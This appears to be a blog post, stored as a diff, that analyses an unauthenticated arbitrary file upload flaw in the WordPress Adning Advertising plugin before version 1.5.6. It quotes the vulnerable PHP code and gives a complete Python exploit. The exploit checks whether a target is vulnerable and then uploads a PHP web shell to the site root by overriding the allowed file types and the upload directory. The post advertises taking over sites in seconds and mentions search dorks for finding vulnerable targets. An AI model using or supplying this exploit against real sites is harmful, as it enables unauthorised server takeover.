@@ -1,0 +1,214 @@
+I"‹)<p>Taking over wordpress sites in seconds using a popular extension known as Adning Advertising with more than 1000 search results (dorks) on publicwww.com.</p>
+
+<ol>
+  <li><a href="#overview">Overview</a></li>
+  <li><a href="#exploit">Exploit </a></li>
+  <li><a href="#demo">Demo </a></li>
+  <li><a href="#source">Source Code</a></li>
+</ol>
+
+<p><a name="overview"></a></p>
+
+<h3 id="overview">Overview</h3>
+<p>Recently I became aware of an exploit for a popular wordpress extension with more than 8,000 installs according to <a href="https://www.wordfence.com/blog/2020/07/critical-vulnerabilities-patched-in-adning-advertising-plugin/">wordfence</a>.</p>
+
+<p>After scanning the web for a proof of concept (POC) with no luck, I eventually decided to download the plugin source code and develop a POC by myself.</p>
+
+<p>Wordpress  is a content management system (CMS) written in PHP that is usually paired with a MySQL database. As such, it inherits all the security vulnerabilities that come with a PHP and SQL backend.</p>
+
+<p>The vulnerable plugin in question is Adning Advertising (adning.com) and the effected versions are reported to be &lt;1.5.6. The plugin allows users to upload advertising banners and manage advertising campaigns. The plugin is located in the base directory: <code class="language-plaintext highlighter-rouge">&lt;wp base&gt;/wp-content/plugins/angwp</code></p>
+
+<p>The first task was to find an older version of the plugin and with a bit of googling managed to stumble on version 1.5.0 for analysis.</p>
+
+<p>After scanning the plugins directory tree I came across the file <code class="language-plaintext highlighter-rouge">&lt;plugin base&gt;/include/classes/ADNI_Uploader.php</code> . It was here where I was quite surprised to see the following snippet of code:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public static $version = '2.0.2';
+	public static $upload_folder = '';
+
+	public function __construct() {
+
+		$_spr_upload_ajax_actions = array(
+			'_ning_upload_image',
+			'_ning_remove_image'
+		);
+
+		foreach($_spr_upload_ajax_actions as $ajax_action)
+        {
+            add_action( 'wp_ajax_' . $ajax_action, array(__CLASS__, str_replace( '-', '_', $ajax_action )));
+            add_action( 'wp_ajax_nopriv_' . $ajax_action, array(__CLASS__, str_replace( '-', '_', $ajax_action )));
+        }
+	}
+</code></pre></div></div>
+<p>Here the author has defined two AJAX actions, one for image uploads <code class="language-plaintext highlighter-rouge">_ning_upload_image</code> and another for deleting images <code class="language-plaintext highlighter-rouge">_ning_remove_image</code>. AJAX actions may be invoked with a POST request to <code class="language-plaintext highlighter-rouge">admin-ajax.php</code> which is located in <code class="language-plaintext highlighter-rouge">&lt;wp base&gt;/wp-admin</code>.</p>
+
+<p>What surprised me was that the author created a <code class="language-plaintext highlighter-rouge">wp_ajax_nopriv_</code> hook to each action, which meant that any unauthenticated user could make requests to both actions and at least theoretically upload or delete <strong>images</strong>.</p>
+
+<p>However the following snippet for the image upload function <code class="language-plaintext highlighter-rouge">_ning_upload_image</code> revealed some interesting peculiarities:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	public static function _ning_upload_image()
+	{
+		$_action = isset($_POST['action']) ? $_POST['action'] : '';
+		$user_id = isset($_POST['uid']) ? $_POST['uid'] : 0;
+		$banner_id = isset($_POST['bid']) ? $_POST['bid'] : 0;
+		$max_upload_size = isset($_POST['max_upload_size']) ? $_POST['max_upload_size'] : 100;
+		$upload = isset($_POST['upload']) ?  json_decode(stripslashes($_POST['upload']), true) : array();
+		$valid_formats = isset($_POST['allowed_file_types']) ? explode(',', $_POST['allowed_file_types']) : array('jpg');
+		if( in_array('jpg', $valid_formats) )
+		{
+			$valid_formats[] = 'jpeg';
+		}
+		//$max_file_size = 1024*100; //100 kb
+		//$max_file_size = 1024000*15; // 15 MB (1 mb = 1000 kb)
+		$max_file_size = 1024000*$max_upload_size;
+		
+		//$upload_path = $upload_dir.'/'.$upload_folder;
+		//$upload_path = $upload_path.$upload_folder;
+		$upload_path = $upload['dir'].$upload['folder'];
+		$count = 0;
+		
+		// Create upload folder if not exists
+		if(!is_dir($upload_path)) {
+		    mkdir($upload_path, 0777, true);
+		}
+
+		if(!empty($_FILES['files'])) 
+		{
+	...
+	
+</code></pre></div></div>
+
+<p>In declaring valid file upload formats, the author has made the file upload whitelist settable through the <code class="language-plaintext highlighter-rouge">allowed_file_types</code> POST parameter. This effectively means that files of any type can be uploaded making this an arbitrary file upload exploit.</p>
+
+<p>Moreover, the file upload path is also user settable through the JSON POST parameter <code class="language-plaintext highlighter-rouge">upload</code>,  which means we have full control over our file upload location. Often times arbitrary file upload exploits do not provide you with a known destination url for your uploaded shell (due to RNGs) so the fact that we have control over the destination directory is incredible convenient!</p>
+
+<p>Finally the actual file data to be uploaded may be passed to the <code class="language-plaintext highlighter-rouge">files</code> POST parameter.</p>
+
+<p><a name="exploit"></a></p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>In developing our python exploit, our first task is to determine how we can call <code class="language-plaintext highlighter-rouge">_ning_upload_image</code> as an unauthenticated user. Thanks to our <code class="language-plaintext highlighter-rouge">wp_ajax_nopriv_</code> hook calling the relevant AJAX action is as simple as: <code class="language-plaintext highlighter-rouge">&lt;base url&gt;/admin-ajax.php?action=_ning_upload_image</code></p>
+
+<p>For versions &lt; 1.5.6 of the software the following string will be returned when no valid post data is provided: <code class="language-plaintext highlighter-rouge">no files found.</code> This string can be used to check if the target host is vulnerable to exploitation.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def vuln_check(uri):
+	response = requests.get(uri)
+	raw = response.text
+
+	if ("no files found" in raw):
+		return True;
+	else:
+		return False;
+...
+</code></pre></div></div>
+
+<p>Next the post parameters: <code class="language-plaintext highlighter-rouge">allowed_file_types</code> and <code class="language-plaintext highlighter-rouge">upload</code> that represent the file whitelist and upload directory respectively need to be sent as a POST request as well as our file data.</p>
+
+<p>The file upload directory is relative to the current php context, for our exploit this is admin-ajax.php which is located in <code class="language-plaintext highlighter-rouge">&lt;wp base&gt;/wp-admin</code> and therefore to upload our shell to the website root directory we supply the following JSON data to the <code class="language-plaintext highlighter-rouge">upload</code> POST parameter: <code class="language-plaintext highlighter-rouge">{"dir" : "../"}</code> . This is then converted into a string using <code class="language-plaintext highlighter-rouge">json.dumps</code></p>
+
+<p>Determining weather our shell has been successfully uploaded is also important and the response received following a successful invocation of the <code class="language-plaintext highlighter-rouge">_ning_upload_image</code> action can be used to determine this.</p>
+
+<p>It was noted that upon file upload success the following string formed part of the response text: <code class="language-plaintext highlighter-rouge">"success":true</code> and this is what was used to determine  a successful state.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	files = {'files[]' : open(file_path)}
+	data = {
+	"allowed_file_types" : "php,jpg,jpeg",
+	"upload" : json.dumps({"dir" : "../"})
+	}
+	
+	print("Uploading Shell...");
+	
+	response = requests.post(uri, files=files, data=data )
+	file_name = path.basename(file_path)
+	
+	if('"success":true' in response.text):
+		print("Shell Uploaded!")
+		if(base[-1] != '/'):
+			base += '/'
+		print(base + file_name)
+	else:
+		print("Shell Upload Failed")
+		sys.exit(1)
+
+</code></pre></div></div>
+
+<p>The full exploit source is shown below:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os.path
+from os import path
+import json
+import requests;
+import sys
+
+def print_banner():
+	print("Adning Advertising &lt; 1.5.6 - Arbitrary File Upload")
+	print("Author -&gt; space_hen (www.lunar.sh)")
+
+def print_usage():
+	print("Usage: python3 exploit.py [target url] [php file]")
+	print("Ex: python3 exploit.py https://example.com ./shell.php")
+
+def vuln_check(uri):
+	response = requests.get(uri)
+	raw = response.text
+
+	if ("no files found" in raw):
+		return True;
+	else:
+		return False;
+
+def main():
+
+	print_banner()
+	if(len(sys.argv) != 3):
+		print_usage();
+		sys.exit(1);
+
+	base = sys.argv[1]
+	file_path = sys.argv[2]
+
+	ajax_action = '_ning_upload_image'
+	admin = '/wp-admin/admin-ajax.php';
+
+	uri = base + admin + '?action=' + ajax_action ;
+	check = vuln_check(uri);
+
+	if(check == False):
+		print("(*) Target not vulnerable!");
+		sys.exit(1)
+
+	if( path.isfile(file_path) == False):
+		print("(*) Invalid file!")
+		sys.exit(1)
+
+	files = {'files[]' : open(file_path)}
+	data = {
+	"allowed_file_types" : "php,jpg,jpeg",
+	"upload" : json.dumps({"dir" : "../"})
+	}
+	print("Uploading Shell...");
+	response = requests.post(uri, files=files, data=data )
+	file_name = path.basename(file_path)
+	if('"success":true' in response.text):
+		print("Shell Uploaded!")
+		if(base[-1] != '/'):
+			base += '/'
+		print(base + file_name)
+	else:
+		print("Shell Upload Failed")
+		sys.exit(1)
+
+main();
+
+
+</code></pre></div></div>
+
+<p><a name="demo"></a></p>
+
+<h3 id="demo">Demo</h3>
+
+<iframe width="720" height="499" src="https://www.youtube.com/embed/Vub3THZRDFk" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+
+<p><a name="source"></a></p>
+
+<h3 id="source-code">Source Code</h3>
+
+<p>The source code for this journal can be found at <a href="https://git.lunar.sh/spacehen/AdningExploit/">https://git.lunar.sh/spacehen/AdningExploit/</a></p>
+:ET
